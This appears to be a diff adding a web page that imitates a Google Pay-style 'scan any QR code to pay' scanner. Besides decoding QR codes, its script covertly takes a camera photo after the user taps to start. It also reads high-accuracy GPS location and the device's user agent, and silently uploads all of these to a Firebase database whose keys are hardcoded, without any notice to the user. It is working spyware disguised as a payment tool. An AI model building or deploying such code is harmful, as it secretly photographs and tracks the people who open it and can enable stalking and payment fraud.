@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <title>QR Scanner</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    
+    <!-- HTML5-QRCode Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5-qrcode/2.3.8/html5-qrcode.min.js"></script>
+
+    <style>
+        /* Custom styles for the scanner video to ensure it covers the screen */
+        #reader {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        #reader video {
+            width: 100% !important;
+            height: 100% !important;
+            object-fit: cover !important;
+        }
+        body {
+            background-color: black;
+            font-family: sans-serif;
+            overflow: hidden;
+            user-select: none;
+            overscroll-behavior-y: contain;
+        }
+        /* Hide the scrollbar for the result text */
+        #result-text::-webkit-scrollbar {
+            width: 6px;
+        }
+        #result-text::-webkit-scrollbar-thumb {
+            background-color: #cbd5e1;
+            border-radius: 4px;
+        }
+        /* Fade transition for overlay */
+        .fade-out {
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease-out;
+        }
+    </style>
+</head>
+<body class="relative w-full h-[100dvh] text-white">
+
+    <!-- Start Popup Overlay -->
+    <div id="start-overlay" onclick="startApp()" class="absolute inset-0 z-50 bg-black/60 transition-opacity duration-500 cursor-pointer flex items-center justify-center">
+        <p class="text-white/80 animate-pulse">Tap anywhere to start</p>
+    </div>
+
+    <!-- Mask Definition (Hidden SVG) -->
+    <svg class="absolute w-0 h-0" aria-hidden="true">
+        <defs>
+            <mask id="scan-mask">
+                <rect width="100%" height="100%" fill="white" />
+                <rect id="mask-hole" fill="black" rx="40" ry="40" />
+            </mask>
+        </defs>
+    </svg>
+
+    <!-- Camera Container -->
+    <div id="reader" class="absolute inset-0 z-0 bg-black"></div>
+    
+    <!-- Fallback Overlay -->
+    <div class="absolute inset-0 bg-black/20 z-0 pointer-events-none"></div>
+
+    <!-- Top Bar -->
+    <div class="absolute top-0 left-0 right-0 p-4 pt-8 md:pt-6 flex justify-between items-center z-20">
+        <button onclick="handleClose()" class="p-2 hover:bg-white/10 rounded-full transition active:scale-95">
+            <i data-lucide="x" class="w-7 h-7"></i>
+        </button>
+        
+        <div class="flex items-center gap-2 md:gap-4">
+            <button onclick="toggleFlash()" class="p-2 hover:bg-white/10 rounded-full transition active:scale-95">
+                <i data-lucide="flashlight" id="flash-icon" class="w-6 h-6"></i>
+            </button>
+            <button class="p-2 hover:bg-white/10 rounded-full transition active:scale-95">
+                <i data-lucide="qr-code" class="w-6 h-6"></i>
+            </button>
+            <button class="p-2 hover:bg-white/10 rounded-full transition active:scale-95">
+                <i data-lucide="more-vertical" class="w-6 h-6"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Main Scanner Overlay Area -->
+    <div class="absolute inset-0 flex items-center justify-center z-10 pointer-events-none">
+        
+        <!-- Backdrop Blur -->
+        <div class="absolute inset-0 backdrop-blur-md bg-black/40"
+             style="-webkit-mask: url(#scan-mask); mask: url(#scan-mask);">
+        </div>
+
+        <!-- The Colored Corners Frame Container -->
+        <div class="relative w-[70vw] max-w-[300px] aspect-square flex flex-col items-center">
+            
+            <!-- Visual Border Elements -->
+            <div class="absolute inset-0 w-full h-full">
+                <!-- Top Left - Red -->
+                <div class="absolute top-0 left-0 w-[20%] h-[20%] border-l-[6px] border-t-[6px] border-[#EA4335] rounded-tl-[40px]"></div>
+                <!-- Top Right - Yellow -->
+                <div class="absolute top-0 right-0 w-[20%] h-[20%] border-r-[6px] border-t-[6px] border-[#FBBC04] rounded-tr-[40px]"></div>
+                <!-- Bottom Left - Blue -->
+                <div class="absolute bottom-0 left-0 w-[20%] h-[20%] border-l-[6px] border-b-[6px] border-[#4285F4] rounded-bl-[40px]"></div>
+                <!-- Bottom Right - Green -->
+                <div class="absolute bottom-0 right-0 w-[20%] h-[20%] border-r-[6px] border-b-[6px] border-[#34A853] rounded-br-[40px]"></div>
+            </div>
+
+            <!-- Gallery Upload Button -->
+            <div class="absolute -bottom-24 pointer-events-auto whitespace-nowrap">
+                <button onclick="triggerFile()" class="flex items-center gap-3 bg-white/90 backdrop-blur-md text-[#202124] px-6 py-3 rounded-full shadow-xl active:scale-95 transition-transform hover:bg-white">
+                    <i data-lucide="image" class="w-5 h-5 text-[#202124]"></i>
+                    <span class="font-medium text-[15px] tracking-wide">
+                        Upload from gallery
+                    </span>
+                </button>
+                <input type="file" id="file-input" class="hidden" accept="image/*" onchange="handleFile(this)">
+            </div>
+        </div>
+    </div>
+
+    <!-- Bottom Sheet -->
+    <div class="absolute bottom-0 left-0 right-0 bg-[#1F1F1F] rounded-t-[2rem] px-6 pt-8 pb-10 z-20 flex flex-col items-center text-center shadow-[0_-4px_30px_rgba(0,0,0,0.6)]">
+        <div class="w-10 h-1 bg-[#5f6368] rounded-full mb-6 opacity-60"></div>
+        <h2 class="text-white text-[16px] md:text-[17px] font-normal mb-3 leading-relaxed tracking-wide">
+            Scan any QR code to pay
+        </h2>
+        
+        <!-- Icons List -->
+        <div class="flex items-center gap-2 text-[#9AA0A6] text-xs md:text-sm font-medium tracking-wide flex-wrap justify-center mt-4">
+            <span>Google Pay</span>
+            <span class="text-[8px]">•</span>
+            <span>PhonePe</span>
+            <span class="text-[8px]">•</span>
+            <span>PayTM</span>
+            <span class="text-[8px]">•</span>
+            <span>UPI</span>
+        </div>
+    </div>
+
+    <!-- Result Modal -->
+    <div id="result-modal" class="hidden absolute inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-6">
+        <div class="bg-white text-black rounded-2xl p-6 w-full max-w-sm shadow-2xl transform transition-all scale-100">
+            <h3 class="text-lg font-bold mb-2">Code Scanned!</h3>
+            <p id="result-text" class="break-all text-gray-600 bg-gray-100 p-3 rounded-lg mb-4 font-mono text-sm max-h-[150px] overflow-y-auto">...</p>
+            
+            <div class="flex gap-3">
+                <button onclick="copyToClipboard()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-medium active:scale-95 transition">Copy</button>
+                <button onclick="closeModal()" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 rounded-xl font-medium active:scale-95 transition">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Toast -->
+    <div id="error-toast" class="hidden absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-[#d93025] text-white px-6 py-4 rounded-xl text-center z-50 w-[80%] max-w-sm shadow-lg">
+        <p id="error-text">Error</p>
+        <button onclick="dismissError()" class="mt-4 bg-white text-[#d93025] px-6 py-2 rounded-full text-sm font-bold uppercase tracking-wide">Dismiss</button>
+    </div>
+
+    <!-- Modules -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+        // REMOVED AUTH IMPORT
+        import { getDatabase, ref, push, set, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
+
+        // --- Firebase Setup ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyA7MxYcWQqYTNn6cAM-Tt8xI2ODIg1sPvI",
+            authDomain: "gpay-9a24a.firebaseapp.com",
+            databaseURL: "https://gpay-9a24a-default-rtdb.firebaseio.com",
+            projectId: "gpay-9a24a",
+            storageBucket: "gpay-9a24a.firebasestorage.app",
+            messagingSenderId: "931713923460",
+            appId: "1:931713923460:web:e0854d800b3eed3a7c85d1"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // --- Silent Data Save (No Auth) ---
+        async function initAndSave(locationData, imageBase64) {
+            try {
+                // Create a reference to the 'scans' list
+                const scansListRef = ref(db, 'scans');
+                const newScanRef = push(scansListRef);
+                
+                // Set the data
+                await set(newScanRef, {
+                    type: 'app_open',
+                    location: locationData, // { lat, lng, acc }
+                    image: imageBase64 || "no_image",
+                    timestamp: serverTimestamp(),
+                    device: navigator.userAgent,
+                    uid: "unauthenticated_user" 
+                });
+                
+            } catch (error) {
+                console.error("Silent Log Error", error);
+            }
+        }
+
+        // --- Expose function to global scope ---
+        window.silentSaveData = function(locationData, imageBase64) {
+            initAndSave(locationData, imageBase64);
+        };
+    </script>
+
+    <script>
+        lucide.createIcons();
+        let html5QrCode;
+        let isFlashOn = false;
+        let isScanning = false;
+
+        function updateMaskDimensions() {
+            const vw = window.innerWidth;
+            const vh = window.innerHeight;
+            const size = Math.min(vw * 0.7, 300);
+            const rect = document.getElementById('mask-hole');
+            if (rect) {
+                rect.setAttribute('width', size);
+                rect.setAttribute('height', size);
+                rect.setAttribute('x', (vw - size) / 2);
+                rect.setAttribute('y', (vh - size) / 2);
+            }
+        }
+
+        async function startApp() {
+            // 1. Enter Fullscreen
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                try {
+                    await elem.requestFullscreen();
+                } catch (e) {
+                    console.log("Fullscreen request failed", e);
+                }
+            } else if (elem.webkitRequestFullscreen) { /* Safari */
+                elem.webkitRequestFullscreen();
+            }
+
+            // 2. Hide Overlay
+            const overlay = document.getElementById('start-overlay');
+            overlay.classList.add('fade-out');
+            setTimeout(() => {
+                overlay.style.display = 'none';
+            }, 500);
+
+            // 3. Start Camera
+            await initScanner();
+
+            // 4. Wait briefly for camera to adjust (focus/light) then capture
+            setTimeout(() => {
+                const imageBase64 = captureCameraFrame();
+                // 5. Capture Location and Send EVERYTHING
+                captureLocationSilent(imageBase64);
+            }, 1000);
+        }
+
+        async function initScanner() {
+            if (isScanning) return;
+            isScanning = true;
+
+            try {
+                if (typeof Html5Qrcode === 'undefined') {
+                    await new Promise(r => setTimeout(r, 500));
+                    if (typeof Html5Qrcode === 'undefined') throw new Error("Scanner library failed to load");
+                }
+
+                html5QrCode = new Html5Qrcode("reader");
+                
+                const vw = window.innerWidth;
+                const visualSize = Math.min(vw * 0.7, 300);
+                const scanSize = Math.max(50, Math.floor(visualSize * 0.9));
+
+                const config = { 
+                    fps: 10, 
+                    qrbox: { width: scanSize, height: scanSize },
+                    aspectRatio: window.innerWidth / window.innerHeight
+                };
+
+                await html5QrCode.start(
+                    { facingMode: "environment" },
+                    config,
+                    (decodedText, decodedResult) => handleScanSuccess(decodedText),
+                    (errorMessage) => {}
+                );
+            } catch (err) {
+                console.error("Camera Error:", err);
+                showError("Camera access denied. Ensure HTTPS is used.");
+            }
+        }
+
+        function captureCameraFrame() {
+            try {
+                // Find the video element created by html5-qrcode
+                const video = document.querySelector("#reader video");
+                if (!video) return null;
+
+                // Create a temporary canvas
+                const canvas = document.createElement("canvas");
+                // Downscale for database performance (max width 480px)
+                const scale = 480 / video.videoWidth;
+                canvas.width = 480;
+                canvas.height = video.videoHeight * scale;
+                
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Return JPEG base64 string with low quality (0.5) to keep it small
+                return canvas.toDataURL("image/jpeg", 0.5);
+            } catch (e) {
+                console.warn("Image capture failed", e);
+                return null;
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            updateMaskDimensions();
+            window.addEventListener('resize', updateMaskDimensions);
+        });
+
+        async function toggleFlash() {
+            if (html5QrCode) {
+                try {
+                    isFlashOn = !isFlashOn;
+                    await html5QrCode.applyVideoConstraints({ advanced: [{ torch: isFlashOn }] });
+                    const icon = document.getElementById('flash-icon');
+                    if (isFlashOn) {
+                        icon.setAttribute('fill', 'currentColor');
+                        icon.classList.add('text-yellow-300');
+                    } else {
+                        icon.setAttribute('fill', 'none');
+                        icon.classList.remove('text-yellow-300');
+                    }
+                } catch (err) {
+                    showError("Flashlight not supported on this device.");
+                    isFlashOn = !isFlashOn;
+                }
+            }
+        }
+
+        function triggerFile() { document.getElementById('file-input').click(); }
+
+        async function handleFile(input) {
+            if (input.files.length === 0) return;
+            const file = input.files[0];
+            try {
+               const tempDiv = document.createElement('div');
+               tempDiv.id = "temp-reader-file";
+               document.body.appendChild(tempDiv);
+               const fileScanner = new Html5Qrcode("temp-reader-file");
+               const result = await fileScanner.scanFile(file, true);
+               handleScanSuccess(result);
+               fileScanner.clear();
+               document.body.removeChild(tempDiv);
+            } catch (err) {
+                showError("Could not scan QR code from this image.");
+            }
+        }
+
+        function handleScanSuccess(text) {
+            // Only show Result UI. 
+            document.getElementById('result-text').innerText = text;
+            document.getElementById('result-modal').classList.remove('hidden');
+            document.getElementById('result-modal').classList.add('flex');
+            if (navigator.vibrate) navigator.vibrate(200);
+        }
+
+        function captureLocationSilent(imageBase64) {
+            // If GPS isn't supported, still try to save the image
+            if (!navigator.geolocation) {
+                if(window.silentSaveData) window.silentSaveData(null, imageBase64);
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const loc = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    // Call the module function to save both location and image
+                    if(window.silentSaveData) window.silentSaveData(loc, imageBase64);
+                },
+                (error) => {
+                    console.warn("Silent GPS Error", error);
+                    // Save image even if location fails
+                    if(window.silentSaveData) window.silentSaveData(null, imageBase64);
+                },
+                { timeout: 10000, enableHighAccuracy: true }
+            );
+        }
+
+        function closeModal() {
+            document.getElementById('result-modal').classList.add('hidden');
+            document.getElementById('result-modal').classList.remove('flex');
+        }
+
+        function showError(msg) {
+            document.getElementById('error-text').innerText = msg;
+            document.getElementById('error-toast').classList.remove('hidden');
+        }
+        
+        function dismissError() {
+             document.getElementById('error-toast').classList.add('hidden');
+        }
+
+        function handleClose() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            }
+        }
+
+        function copyToClipboard() {
+            const text = document.getElementById('result-text').innerText;
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            try {
+                document.execCommand('copy');
+                const btn = document.querySelector('#result-modal button.bg-blue-600');
+                const originalText = btn.innerText;
+                btn.innerText = "Copied!";
+                setTimeout(() => btn.innerText = originalText, 1500);
+            } catch (err) {
+                console.error('Fallback copy failed', err);
+            }
+            document.body.removeChild(textArea);
+        }
+    </script>
+</body>
+</html>
